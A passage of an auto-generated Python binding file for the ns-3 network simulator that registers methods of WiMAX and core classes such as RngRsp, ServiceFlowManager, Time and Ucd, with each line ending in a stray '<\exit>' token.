cls.add_method('GetRangingAnomalies',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetReqDlBurstProfile',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('PrintDebug',<\exit>
'void',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetMacAddress',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'macAddress')])<\exit>
cls.add_method('SetRangingAnomalies',<\exit>
'void',<\exit>
[param('uint8_t', 'rangingAnomalies')])<\exit>
cls.add_method('SetReqDlBurstProfile',<\exit>
'void',<\exit>
[param('uint8_t', 'reqDlBurstProfile')])<\exit>
return<\exit>
def register_Ns3RngRsp_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::RngRsp const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetAasBdcastPermission',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBasicCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlFreqOverride',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlOperBurstProfile',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameNumber',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInitRangOppNumber',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMacAddress',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetOffsetFreqAdjust',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPowerLevelAdjust',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPrimaryCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangStatus',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangSubchnl',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTimingAdjust',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUlChnlIdOverride',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetAasBdcastPermission',<\exit>
'void',<\exit>
[param('uint8_t', 'aasBdcastPermission')])<\exit>
cls.add_method('SetBasicCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'basicCid')])<\exit>
cls.add_method('SetDlFreqOverride',<\exit>
'void',<\exit>
[param('uint32_t', 'dlFreqOverride')])<\exit>
cls.add_method('SetDlOperBurstProfile',<\exit>
'void',<\exit>
[param('uint16_t', 'dlOperBurstProfile')])<\exit>
cls.add_method('SetFrameNumber',<\exit>
'void',<\exit>
[param('uint32_t', 'frameNumber')])<\exit>
cls.add_method('SetInitRangOppNumber',<\exit>
'void',<\exit>
[param('uint8_t', 'initRangOppNumber')])<\exit>
cls.add_method('SetMacAddress',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'macAddress')])<\exit>
cls.add_method('SetOffsetFreqAdjust',<\exit>
'void',<\exit>
[param('uint32_t', 'offsetFreqAdjust')])<\exit>
cls.add_method('SetPowerLevelAdjust',<\exit>
'void',<\exit>
[param('uint8_t', 'powerLevelAdjust')])<\exit>
cls.add_method('SetPrimaryCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'primaryCid')])<\exit>
cls.add_method('SetRangStatus',<\exit>
'void',<\exit>
[param('uint8_t', 'rangStatus')])<\exit>
cls.add_method('SetRangSubchnl',<\exit>
'void',<\exit>
[param('uint8_t', 'rangSubchnl')])<\exit>
cls.add_method('SetTimingAdjust',<\exit>
'void',<\exit>
[param('uint32_t', 'timingAdjust')])<\exit>
cls.add_method('SetUlChnlIdOverride',<\exit>
'void',<\exit>
[param('uint8_t', 'ulChnlIdOverride')])<\exit>
return<\exit>
def register_Ns3SSManager_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SSManager const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('CreateSSRecord',<\exit>
'ns3::SSRecord *',<\exit>
[param('ns3::Mac48Address const &', 'macAddress')])<\exit>
cls.add_method('DeleteSSRecord',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('GetMacAddress',<\exit>
'ns3::Mac48Address',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
cls.add_method('GetNRegisteredSSs',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNSSs',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSSRecord',<\exit>
'ns3::SSRecord *',<\exit>
[param('ns3::Mac48Address const &', 'macAddress')],<\exit>
is_const=True)<\exit>
cls.add_method('GetSSRecord',<\exit>
'ns3::SSRecord *',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
cls.add_method('GetSSRecords',<\exit>
'std::vector< ns3::SSRecord * > *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsInRecord',<\exit>
'bool',<\exit>
[param('ns3::Mac48Address const &', 'macAddress')],<\exit>
is_const=True)<\exit>
cls.add_method('IsRegistered',<\exit>
'bool',<\exit>
[param('ns3::Mac48Address const &', 'macAddress')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3ServiceFlowManager_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ServiceFlowManager const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('AreServiceFlowsAllocated',<\exit>
'bool',<\exit>
[])<\exit>
cls.add_method('AreServiceFlowsAllocated',<\exit>
'bool',<\exit>
[param('std::vector< ns3::ServiceFlow * > *', 'serviceFlows')])<\exit>
cls.add_method('AreServiceFlowsAllocated',<\exit>
'bool',<\exit>
[param('std::vector< ns3::ServiceFlow * >', 'serviceFlows')])<\exit>
cls.add_method('DoClassify',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('ns3::Ipv4Address', 'SrcAddress'), param('ns3::Ipv4Address', 'DstAddress'), param('uint16_t', 'SrcPort'), param('uint16_t', 'DstPort'), param('uint8_t', 'Proto'), param('ns3::ServiceFlow::Direction', 'dir')],<\exit>
is_const=True)<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetNextServiceFlowToAllocate',<\exit>
'ns3::ServiceFlow *',<\exit>
[])<\exit>
cls.add_method('GetNrServiceFlows',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('uint32_t', 'sfid')],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlows',<\exit>
'std::vector< ns3::ServiceFlow * >',<\exit>
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SfVectorTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SfVectorTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::SfVectorTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3AttributeAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeAccessor__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::AttributeAccessor, ns3::empty, ns3::DefaultDeleter< ns3::AttributeAccessor > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3AttributeChecker_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeChecker__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::AttributeChecker, ns3::empty, ns3::DefaultDeleter< ns3::AttributeChecker > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3AttributeValue_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeValue__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::AttributeValue, ns3::empty, ns3::DefaultDeleter< ns3::AttributeValue > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3CallbackImplBase_Ns3Empty_Ns3DefaultDeleter__lt__ns3CallbackImplBase__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::CallbackImplBase, ns3::empty, ns3::DefaultDeleter< ns3::CallbackImplBase > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3EventImpl_Ns3Empty_Ns3DefaultDeleter__lt__ns3EventImpl__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::EventImpl, ns3::empty, ns3::DefaultDeleter< ns3::EventImpl > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3NixVector_Ns3Empty_Ns3DefaultDeleter__lt__ns3NixVector__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::NixVector, ns3::empty, ns3::DefaultDeleter< ns3::NixVector > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3OutputStreamWrapper_Ns3Empty_Ns3DefaultDeleter__lt__ns3OutputStreamWrapper__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::OutputStreamWrapper, ns3::empty, ns3::DefaultDeleter< ns3::OutputStreamWrapper > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3Packet_Ns3Empty_Ns3DefaultDeleter__lt__ns3Packet__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::Packet, ns3::empty, ns3::DefaultDeleter< ns3::Packet > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3TraceSourceAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3TraceSourceAccessor__gt___methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::TraceSourceAccessor, ns3::empty, ns3::DefaultDeleter< ns3::TraceSourceAccessor > > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SsServiceFlowManager_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SsServiceFlowManager const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::SubscriberStationNetDevice >', 'device')])<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow', 'serviceFlow')])<\exit>
cls.add_method('CreateDsaAck',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[])<\exit>
cls.add_method('CreateDsaReq',<\exit>
'ns3::DsaReq',<\exit>
[param('ns3::ServiceFlow const *', 'serviceFlow')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetDsaAckTimeoutEvent',<\exit>
'ns3::EventId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDsaRspTimeoutEvent',<\exit>
'ns3::EventId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMaxDsaReqRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('InitiateServiceFlows',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('ProcessDsaRsp',<\exit>
'void',<\exit>
[param('ns3::DsaRsp const &', 'dsaRsp')])<\exit>
cls.add_method('ScheduleDsaReq',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow const *', 'serviceFlow')])<\exit>
cls.add_method('SetMaxDsaReqRetries',<\exit>
'void',<\exit>
[param('uint8_t', 'maxDsaReqRetries')])<\exit>
return<\exit>
def register_Ns3ThreeLogDistancePropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3Time_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_inplace_numeric_operator('+=', param('ns3::Time const &', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::Time'], root_module['ns3::Time'], param('ns3::Time const &', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::Time'], root_module['ns3::Time'], param('ns3::Time const &', 'right'))<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_binary_comparison_operator('>')<\exit>
cls.add_inplace_numeric_operator('-=', param('ns3::Time const &', 'right'))<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('<=')<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_binary_comparison_operator('>=')<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Time const &', 'o')])<\exit>
cls.add_constructor([param('double', 'v')])<\exit>
cls.add_constructor([param('int', 'v')])<\exit>
cls.add_constructor([param('long int', 'v')])<\exit>
cls.add_constructor([param('long long int', 'v')])<\exit>
cls.add_constructor([param('unsigned int', 'v')])<\exit>
cls.add_constructor([param('long unsigned int', 'v')])<\exit>
cls.add_constructor([param('long long unsigned int', 'v')])<\exit>
cls.add_constructor([param('std::string const &', 's')])<\exit>
cls.add_constructor([param('ns3::int64x64_t const &', 'value')])<\exit>
cls.add_method('Compare',<\exit>
'int',<\exit>
[param('ns3::Time const &', 'o')],<\exit>
is_const=True)<\exit>
cls.add_method('From',<\exit>
'ns3::Time',<\exit>
[param('ns3::int64x64_t const &', 'from'), param('ns3::Time::Unit', 'timeUnit')],<\exit>
is_static=True)<\exit>
cls.add_method('From',<\exit>
'ns3::Time',<\exit>
[param('ns3::int64x64_t const &', 'value')],<\exit>
is_static=True)<\exit>
cls.add_method('FromDouble',<\exit>
'ns3::Time',<\exit>
[param('double', 'value'), param('ns3::Time::Unit', 'timeUnit')],<\exit>
is_static=True)<\exit>
cls.add_method('FromInteger',<\exit>
'ns3::Time',<\exit>
[param('uint64_t', 'value'), param('ns3::Time::Unit', 'timeUnit')],<\exit>
is_static=True)<\exit>
cls.add_method('GetDouble',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFemtoSeconds',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInteger',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMicroSeconds',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMilliSeconds',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNanoSeconds',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPicoSeconds',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetResolution',<\exit>
'ns3::Time::Unit',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetSeconds',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTimeStep',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsNegative',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsPositive',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsStrictlyNegative',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsStrictlyPositive',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsZero',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetResolution',<\exit>
'void',<\exit>
[param('ns3::Time::Unit', 'resolution')],<\exit>
is_static=True)<\exit>
cls.add_method('To',<\exit>
'ns3::int64x64_t',<\exit>
[param('ns3::Time::Unit', 'timeUnit')],<\exit>
is_const=True)<\exit>
cls.add_method('ToDouble',<\exit>
'double',<\exit>
[param('ns3::Time::Unit', 'timeUnit')],<\exit>
is_const=True)<\exit>
cls.add_method('ToInteger',<\exit>
'int64_t',<\exit>
[param('ns3::Time::Unit', 'timeUnit')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3Tlv_methods(root_module, cls):<\exit>
cls.add_constructor([param('uint8_t', 'type'), param('uint64_t', 'length'), param('ns3::TlvValue const &', 'value')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Tlv const &', 'tlv')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Tlv *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('CopyValue',<\exit>
'ns3::TlvValue *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetLength',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetSizeOfLen',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('PeekValue',<\exit>
'ns3::TlvValue *',<\exit>
[])<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3TraceSourceAccessor_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::TraceSourceAccessor const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Connect',<\exit>
'bool',<\exit>
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('ConnectWithoutContext',<\exit>
'bool',<\exit>
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('ns3::CallbackBase const &', 'cb')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Disconnect',<\exit>
'bool',<\exit>
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('DisconnectWithoutContext',<\exit>
'bool',<\exit>
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('ns3::CallbackBase const &', 'cb')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3Trailer_methods(root_module, cls):<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Trailer const &', 'arg0')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'end')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3TwoRayGroundPropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetLambda',<\exit>
'void',<\exit>
[param('double', 'frequency'), param('double', 'speed')])<\exit>
cls.add_method('SetLambda',<\exit>
'void',<\exit>
[param('double', 'lambda')])<\exit>
cls.add_method('SetSystemLoss',<\exit>
'void',<\exit>
[param('double', 'systemLoss')])<\exit>
cls.add_method('SetMinDistance',<\exit>
'void',<\exit>
[param('double', 'minDistance')])<\exit>
cls.add_method('GetMinDistance',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLambda',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSystemLoss',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetHeightAboveZ',<\exit>
'void',<\exit>
[param('double', 'heightAboveZ')])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3Ucd_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Ucd const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddUlBurstProfile',<\exit>
'void',<\exit>
[param('ns3::OfdmUlBurstProfile', 'ulBurstProfile')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetChannelEncodings',<\exit>
'ns3::OfdmUcdChannelEncodings',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConfigurationChangeCount',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrUlBurstProfiles',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangingBackoffEnd',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangingBackoffStart',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRequestBackoffEnd',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRequestBackoffStart',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUlBurstProfiles',<\exit>
'std::vector< ns3::OfdmUlBurstProfile >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetChannelEncodings',<\exit>
'void',<\exit>
[param('ns3::OfdmUcdChannelEncodings', 'channelEncodings')])<\exit>
cls.add_method('SetConfigurationChangeCount',<\exit>
'void',<\exit>
[param('uint8_t', 'ucdCount')])<\exit>
cls.add_method('SetNrUlBurstProfiles',<\exit>
'void',<\exit>
[param('uint8_t', 'nrUlBurstProfiles')])<\exit>
cls.add_method('SetRangingBackoffEnd',<\exit>
'void',<\exit>
[param('uint8_t', 'rangingBackoffEnd')])<\exit>
cls.add_method('SetRangingBackoffStart',<\exit>
'void',<\exit>
[param('uint8_t', 'rangingBackoffStart')])<\exit>
cls.add_method('SetRequestBackoffEnd',<\exit>
'void',<\exit>
[param('uint8_t', 'requestBackoffEnd')])<\exit>
cls.add_method('SetRequestBackoffStart',<\exit>
'void',<\exit>
[param('uint8_t', 'requestBackoffStart')])<\exit>
return<\exit>
def register_Ns3UlJob_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('ns3::UlJob const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetDeadline',<\exit>
'ns3::Time',<\exit>
[])<\exit>
cls.add_method('GetPeriod',<\exit>
'ns3::Time',<\exit>
[])<\exit>
cls.add_method('GetReleaseTime',<\exit>
'ns3::Time',<\exit>
[])<\exit>
cls.add_method('GetSchedulingType',<\exit>
'ns3::ServiceFlow::SchedulingType',<\exit>
[])<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow *',<\exit>
[])<\exit>
cls.add_method('GetSize',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSsRecord',<\exit>
'ns3::SSRecord *',<\exit>
[])<\exit>
cls.add_method('GetType',<\exit>
'ns3::ReqType',<\exit>
[])<\exit>
cls.add_method('SetDeadline',<\exit>
'void',<\exit>
[param('ns3::Time', 'deadline')])<\exit>
cls.add_method('SetPeriod',<\exit>
'void',<\exit>
[param('ns3::Time', 'period')])<\exit>
cls.add_method('SetReleaseTime',<\exit>
'void',<\exit>
[param('ns3::Time', 'releaseTime')])<\exit>
cls.add_method('SetSchedulingType',<\exit>
'void',<\exit>
